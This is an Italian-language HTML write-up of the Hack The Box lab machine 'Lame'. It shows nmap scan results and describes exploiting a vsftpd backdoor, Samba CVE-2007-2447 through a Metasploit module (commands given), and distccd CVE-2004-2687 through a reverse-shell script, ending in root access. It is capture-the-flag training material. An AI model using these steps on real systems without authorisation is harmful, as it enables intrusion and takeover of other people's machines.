@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<head>
+<title> HTB - Lame </title>
+<meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="generator" content="Org-mode"><meta name="author" content="Leonardo Tamiano">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.5/css/bootstrap.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/tonsky/FiraCode@5.2/distr/fira_code.css">
+<style>
+body {
+   font-family: 'Fira Code', monospace;
+   font-size: 20px;
+}
+
+.collapsible {
+   background-color: white;
+   border: none;
+   text-align: left;
+}
+      
+.top-buffer { margin-top: 18px; }
+
+figcaption { font-size: 15px; }
+
+footer { text-align: center; }
+
+.observation {
+   border-style: solid;
+   margin-top: 20px;
+   margin-bottom: 20px;
+}
+
+pre {
+   font-size: 20px;
+   background-color: black;
+   color: white;
+}
+
+blockquote {
+    border-left: 5px solid #000000;
+    background-color: #F2EFE4;
+}
+
+@media (max-width: 576px) {
+  * {
+      font-size: 15px;
+    }
+
+   h1 {
+       font-size: 20px;
+   }
+
+   h2, h3, h4, h5 {
+       font-size: 20px;
+   }
+
+   blockquote {
+       font-size: 15px;
+   }
+}
+
+</style>
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  displayAlign: "center",
+  displayIndent: "2em",
+  messageStyle: "none",
+  "HTML-CSS": {
+    scale: 100,
+    styles: {
+      ".MathJax_Display": {
+        "font-size": "100%"
+      }
+    }
+  },
+  "SVG": {
+    scale: 100,
+    styles: {
+      ".MathJax_SVG_Display": {
+        "font-size": "100%",
+        "margin-left": "-2.281em"
+      }
+    }
+  }
+});
+</script>
+<script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS_SVG"></script>
+</head>
+<body>
+<div id="content" class="container">
+
+<div class="row top-buffer"> </div>
+
+<div class="row">
+   <div class="col-xs-1"></div>
+   <div class="col-xs-10"><h1 class="title">HTB - Lame</h1>
+   </div>
+   <div class="col-xs-1"></div>
+</div> <!-- end row -->
+<div class="row">
+   <div class="col-xs-1"></div>
+   <div class="col-xs-10"><hr style="border: 1px solid #000000" />   </div>
+   <div class="col-xs-1"></div>
+</div> <!-- end row -->
+
+<div class="row">
+   <div class="col-xs-1"></div>
+   <div class="col-xs-10"><div id="outline-container-sec-" class="outline-2"><button type="button" class="collapsible">
+<h2 id="sec-" style="text-decoration: underline">  Basic Info &triangledown;</h2>
+</button><div class='sec- collapsible-content'>
+<ul class="org-ul">
+<li><p>
+<b>Default IP</b>: 
+</p>
+</li>
+<li><p>
+<b>Video</b>: 
+</p>
+</li>
+<li><p>
+<b>Table of contents</b>:
+</p>
+<nav id="table-of-contents">
+<div id="text-table-of-contents" class="bs-docs-sidebar">
+<ul>
+<li><a href="#sec-">Basic Info</a></li>
+<li><a href="#sec-1">Video Walkthrough</a>
+<ul>
+<li><a href="#sec-1-1">Nmap Scans</a>
+<ul>
+<li><a href="#sec-1-1-1">nmap -sC -sV -Pn lame</a></li>
+<li><a href="#sec-1-1-2">nmap -p- -Pn lame</a></li>
+<li><a href="#sec-1-1-3">Review</a></li>
+</ul>
+</li>
+<li><a href="#sec-1-2">vsftpd 2.3.4 Backdoor</a></li>
+<li><a href="#sec-1-3">samba CVE-2007-2447</a></li>
+<li><a href="#sec-1-4">distccd CVE-2004-2687</a></li>
+</ul>
+</li>
+</ul>
+</div>
+</nav>
+</li>
+</ul>
+
+<hr >
+
+<p>
+A seguire è riportato un breve walkthrough della macchina <b>Lame</b>
+offerta dalla piattaforma Hack the Box.
+</p>
+</div>
+</div>
+   </div>
+   <div class="col-xs-1"></div>
+</div> <!-- end row -->
+
+
+<div class="row">
+   <div class="col-xs-1"></div>
+   <div class="col-xs-10"><div id="outline-container-sec-1" class="outline-2"><button type="button" class="collapsible">
+<h2 id="sec-1" style="text-decoration: underline"> 1 Video Walkthrough &triangledown;</h2>
+</button>
+<div class="row">
+   <div class="col-xs-3"></div>
+   <div class="col-xs-6"><hr style="border: 1px solid #000000" />   </div>
+   <div class="col-xs-3"></div>
+</div> <!-- end row --><div id="outline-container-sec-1-1" class="outline-3"><button type="button" class="collapsible">
+<h3 id="sec-1-1" nil> 1.1 Nmap Scans &triangledown;</h3>
+</button><div class='sec-1-1 collapsible-content'>
+<p>
+Iniziamo come al solito utilizzando nmap per effettuare lo scans
+delle porte per ottenere la seguente situazione:
+</p>
+</div>
+
+
+<div class="row">
+   <div class="col-xs-4"></div>
+   <div class="col-xs-4"><hr style="border: 1px solid #000000" />   </div>
+   <div class="col-xs-4"></div>
+</div> <!-- end row --><div id="outline-container-sec-1-1-1" class="outline-4"><button type="button" class="collapsible">
+<h4 id="sec-1-1-1" nil> 1.1.1 <b>nmap -sC -sV -Pn lame</b> &triangledown;</h4>
+</button><div class='sec-1-1-1 collapsible-content'>
+<pre class="example">
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-05 20:49 CEST
+Host is up (0.052s latency).
+Not shown: 996 filtered ports
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.14.70
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 2h00m36s, deviation: 2h49m43s, median: 35s
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.20-Debian)
+|   Computer name: lame
+|   NetBIOS computer name: 
+|   Domain name: hackthebox.gr
+|   FQDN: lame.hackthebox.gr
+|_  System time: 2021-07-05T14:50:04-04:00
+| smb-security-mode: 
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 56.92 seconds
+</pre>
+</div>
+</div>
+
+<div class="row">
+   <div class="col-xs-4"></div>
+   <div class="col-xs-4"><hr style="border: 1px solid #000000" />   </div>
+   <div class="col-xs-4"></div>
+</div> <!-- end row -->
+
+<div id="outline-container-sec-1-1-2" class="outline-4"><button type="button" class="collapsible">
+<h4 id="sec-1-1-2" nil> 1.1.2 <b>nmap -p- -Pn lame</b> &triangledown;</h4>
+</button><div class='sec-1-1-2 collapsible-content'>
+<pre class="example">
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-05 20:49 CEST
+Stats: 0:00:42 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 30.84% done; ETC: 20:51 (0:01:36 remaining)
+Nmap scan report for lame (10.129.171.68)
+Host is up (0.052s latency).
+Not shown: 65530 filtered ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3632/tcp open  distccd
+
+Nmap done: 1 IP address (1 host up) scanned in 104.70 seconds    
+</pre>
+</div>
+</div>
+
+<div class="row">
+   <div class="col-xs-4"></div>
+   <div class="col-xs-4"><hr style="border: 1px solid #000000" />   </div>
+   <div class="col-xs-4"></div>
+</div> <!-- end row -->
+
+<div id="outline-container-sec-1-1-3" class="outline-4"><button type="button" class="collapsible">
+<h4 id="sec-1-1-3" nil> 1.1.3 <b>Review</b> &triangledown;</h4>
+</button><div class='sec-1-1-3 collapsible-content'>
+<p>
+Le porte di interesse dallo scan sono tre, e sono le seguenti:
+</p>
+
+<ul class="org-ul">
+<li><p>
+La porta 21 è interessante in quanto la versione del software
+<b>vsftpd 2.3.4</b> è vulnerabile ad una nota backdoor.
+</p>
+</li>
+
+<li><p>
+La porta 445 è interessante in quanto il protocollo samba è un
+protocollo critico che potrebbe presentari vari punti di
+accesso, e la particolare versione che gira sul server è
+vulnerabile a <b>CVE-2007-2447.</b>
+</p>
+</li>
+
+<li><p>
+Infine, la porta 3632 è interessante per il servizio che offre,
+che è vulnearbile a <b>CVE-2004-2687</b>.
+</p>
+</li>
+</ul>
+</div>
+</div>
+</div>
+
+<div class="row">
+   <div class="col-xs-3"></div>
+   <div class="col-xs-6"><hr style="border: 1px solid #000000" />   </div>
+   <div class="col-xs-3"></div>
+</div> <!-- end row -->
+
+<div id="outline-container-sec-1-2" class="outline-3"><button type="button" class="collapsible">
+<h3 id="sec-1-2" nil> 1.2 vsftpd 2.3.4 Backdoor &triangledown;</h3>
+</button><div class='sec-1-2 collapsible-content'>
+<p>
+L'idea è quella di fare il login anonimo con ftp utilizzando, nello
+username, i caratteri <code>:)</code> per attivare la backdoor nel server nella
+porta <code>6200</code>.
+</p>
+
+<p>
+Notiamo però che in questo particolare server la backdoor non
+funziona.
+</p>
+</div>
+</div>
+
+<div class="row">
+   <div class="col-xs-3"></div>
+   <div class="col-xs-6"><hr style="border: 1px solid #000000" />   </div>
+   <div class="col-xs-3"></div>
+</div> <!-- end row -->
+
+<div id="outline-container-sec-1-3" class="outline-3"><button type="button" class="collapsible">
+<h3 id="sec-1-3" nil> 1.3 samba CVE-2007-2447 &triangledown;</h3>
+</button><div class='sec-1-3 collapsible-content'>
+<p>
+È possibile utilizzare un modulo di metasploit per exploitare la
+<b>CVE-2007-2447</b>.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">msfconsole
+use exploit/multi/samba/usermap_script
+<span style="color: #4f97d7;">set</span> RHOSTS lame
+<span style="color: #4f97d7;">set</span> LHOST tun0
+run
+</pre>
+</div>
+
+<p>
+In questo modo otteniamo una root da shell e siamo in grado di
+leggere entrambe le flags, sia quella user, situata in
+<code>/home/makis/user.txt</code>, e sia quella root, situata in <code>/root/root.txt</code>.
+</p>
+</div>
+</div>
+
+<div class="row">
+   <div class="col-xs-3"></div>
+   <div class="col-xs-6"><hr style="border: 1px solid #000000" />   </div>
+   <div class="col-xs-3"></div>
+</div> <!-- end row -->
+
+<div id="outline-container-sec-1-4" class="outline-3"><button type="button" class="collapsible">
+<h3 id="sec-1-4" nil> 1.4 distccd CVE-2004-2687 &triangledown;</h3>
+</button><div class='sec-1-4 collapsible-content'>
+<p>
+Per exploitare questa vulnerabilità ho preso lo script dal seguente
+<a href="https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855">link</a> e l'ho modificato leggermente per ottenere il seguente nuovo
+script: <a href="./my_distccd_rce.py">my_distccd_rce.py</a>
+</p>
+
+<p>
+Questo script invia un messaggio utilizzando il protocollo <b>distccd</b>
+per far esegurie al server un comando arbitrario passato tramite lo
+script.
+</p>
+
+<p>
+Utilizzando questo script possiamo spawnare una reverse shell con
+l'utente <code>daemon</code>. Una volta che abbiamo questa shell possiamo
+utilizzare il comando
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">rlogin -l root localhost
+</pre>
+</div>
+
+<p>
+per prendere la shell da root e leggere entrambe le flags.
+</p>
+</div>
+</div>
+</div>
+   </div>
+   <div class="col-xs-1"></div>
+</div> <!-- end row -->
+
+<div class="row top-buffer"> </div>
+
+<div class="row top-buffer"> </div>
+
+<div class="row">
+   <div class="col-xs-1"></div>
+   <div class="col-xs-10"><hr style="border: 1px solid #000000" />   </div>
+   <div class="col-xs-1"></div>
+</div> <!-- end row -->
+<div class="row">
+   <div class="col-xs-1"></div>
+   <div class="col-xs-10"><footer id="postamble">
+<div>
+<p class="author"><b>Author</b>: Leonardo Tamiano</p><p class="email"><b>Email</b>: <a href="mailto:leonardotamiano95@gmail.com">leonardotamiano95@gmail.com</a></p><p class="date"><b>Created</b>: 2021-07-12 lun 22:04</p>
+</div>
+</footer>
+   </div>
+   <div class="col-xs-1"></div>
+</div> <!-- end row -->
+<div class="row top-buffer"> </div>
+
+<div class="row top-buffer"> </div>
+
+<div class="row top-buffer"> </div>
+<script>
+// -- Deal with the hiding/showing of the various sections
+var buttons = document.getElementsByClassName('collapsible');
+// -- TODO: implement this
+var sections_to_not_hide = ['Lecture Info', 'Overview', 'Basic Info']
+
+for (var i = 0; i < buttons.length; i++) {
+  buttons[i].addEventListener('click', function() {
+    var content = this.parentElement;
+    divs = content.getElementsByTagName('div');
+    
+    for (var j = 0; j < divs.length; j++) {
+      if (divs[j].style.display === '' || divs[j].style.display === 'block') {
+        divs[j].style.display = 'none';
+      } else {
+	divs[j].style.display = 'block';
+      }
+    }
+
+  });
+
+  // -- Check which sections to hide initially
+  html_elem = buttons[i].getElementsByTagName('h2').length > 0 ?
+    buttons[i].getElementsByTagName('h2')[0] :
+    buttons[i].getElementsByTagName('h3').length > 0 ?
+    buttons[i].getElementsByTagName('h3')[0] :
+    buttons[i].getElementsByTagName('h4')[0];
+
+  var hide_section = true;
+
+  for (var h = 0; h < sections_to_not_hide.length; h++) {
+    if (html_elem.innerHTML.includes(sections_to_not_hide[h])) {
+      hide_section = false;
+    }
+  }
+
+  if (hide_section) {
+    divs = buttons[i].parentElement.getElementsByTagName('div');
+
+    for (var j = 0; j < divs.length; j++) {
+      divs[j].style.display =
+	divs[j].style.display === '' || divs[j].style.display === 'block' ?
+	divs[j].style.display = 'none' :
+	divs[j].style.display = 'block';
+    }
+  }
+}
+</script></div>
+</body>
+</html>
